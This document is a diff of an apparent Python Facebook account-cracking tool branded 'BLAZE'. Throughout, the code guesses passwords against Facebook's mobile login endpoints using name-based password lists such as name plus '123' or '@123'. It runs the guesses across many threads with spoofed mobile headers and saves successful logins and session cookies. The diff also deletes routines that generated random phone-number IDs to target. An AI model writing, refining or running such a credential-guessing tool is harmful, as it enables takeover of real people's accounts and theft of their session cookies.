@@ -288,7 +288,7 @@ class __crack__:
             headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
             dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2707.112 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
             if 'c_user' in ses.cookies.get_dict():
                 print('\r\033[1;32m [BLAZE-Ok]\033[1;32m %s | %s      ' % (user,pw))
@@ -329,15 +329,15 @@ class __crack__:
                         uid, name = yntkts.split('|')
                         xz = name.split(' ')
                         if len(xz) == 1:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
                         elif len(xz) == 2:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
                         elif len(xz) == 3:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
                         elif len(xz) == 4:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
                         _ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
@@ -725,71 +725,7 @@ cps = []
 				
 	
 
-#_______
-def india():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;31m[•] NOT : PUT 977,978,990,663,667,778 etc')
-	linex()
-	kode = input('\033[1;37m[•] Put  Your Country Code: ')
-	os.system('clear')
-	print(logo)
-	limit = int(input('[+] Your Idz lemit : '))
-	linex()
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[•] Total Acounts : '+tl)
-		print('[•] Selected Code : \x1b[1;92m'+code)
-		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
-		linex()
-		for guru in uid:
-			uid = '+91'+kode+guru
-			aj = uid[0:6]
-			aja = uid[0:8]
-			pwx = [guru,kode+guru,aj,aja]
-			yaari.submit(rcrack,uid,pwx,tl)
-	print(50*'-')
-	print('Crack process has been completed')
-	print('Ids saved in ok.txt,cp.txt')
-	print(47*'-')
-	facebookweb()
-def bd():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;31m[•] NOT : PUT 130,131,141etc')
-	linex()
-	kode = input('[+]\033[1;36m Put  Your Country Code: ')
-	os.system('clear')
-	print(logo)
-	limit = int(input('[+] Your Idz lemit : '))
-	linex()
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[•] Total Acounts : '+tl)
-		print('[•] Selected Code : \x1b[1;92m'+code)
-		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
-		linex()
-		for guru in uid:
-			uid = '+880'+kode+guru
-			pwx = [guru,kode+guru]
-			yaari.submit(rcrack,uid,pwx,tl)
-	print(50*'-')
-	print('Crack process has been completed')
-	print('Ids saved in ok.txt,cp.txt')
-	print(47*'-')
-	facebookweb()
+
 def rcrack(uid,pwx,tl):
 	#print(uid)
 	global loop
@@ -831,12 +767,15 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"k":"rev,1012381695;locale,en_GB;cohort,BP:DEFAULT;branch,trunk;dpr,2;features,;u,100027368653839;","a":"1711625513","t":31536000,"n":"N1MfNgeU","v":"2450","p":4,"r":1012380726,"o":"h2","y":"wblt"}',
+    'service-worker-navigation-preload': '{"k":"rev,1012381695;locale,en_GB;cohort,BP:DEFAULT;branch,trunk;dpr,2;features,;u,100027368653839;","a":"1711627065","t":31536000,"n":"nA2GPvuC","v":"2450","p":4,"r":1012381695,"o":"h2","y":"wblt"}',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
-    'viewport-width': '980',
+    
 }
 			response = requests.get('https://p.facebook.com/', cookies=cookies, headers=headers)
+    
+    
+			
 					
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -949,15 +888,15 @@ def file():
     os.system("clear")
     print(logo)
     if 'PRO' in l:
-        Aftab2 = 'mr.Aftab'
+        BLAZE2 = 'mr.Aftab'
     else:
-        Aftab2 = input(f"[+]Enter File: ")
+        BLAZE2 = input(f"[+]Enter File: ")
     try:
-        for x in open(Aftab2,'r').readlines():
+        for x in open(BLAZE2,'r').readlines():
             accounts.append(x.strip())
     except:
         print(f"File Not Found");time.sleep(1)
-        Aftab()
+        BLAZE2()
      
     method()
     exit()
@@ -979,7 +918,7 @@ def method():
     os.system("clear")
     print(logo)
     if 'o':      
-        lp = input(f'[+] how many password do ypu want to add :? ')
+        lp = input(f'[+] HOW MANY PASS DO YOU WANNA ADD :? ')
         if lp.isnumeric():
             clear()
             ex = 'firstlast first123 last123'
@@ -996,11 +935,11 @@ def method():
     linex()
     m=input(f"{('!')}Input : ") 
     clear()
-    print(''+("[•] ")+'Do You Want To Show Cp Ids?(y/n)')
+    print(''+("[•] ")+'DO YOU WANT TO SHOW CP ID?(y/n)')
     linex()
     cpok=input(f"{('!')}Input : ")
     clear()
-    print(''+("[•] ")+'Do You Want To Show Cookies?(y/n)')
+    print(''+("[•] ")+'DO YOU WANT TO SHOW COOKIES?(y/n)')
     linex()
     c=input(f"{('!')}Input : ")
     apps='y'
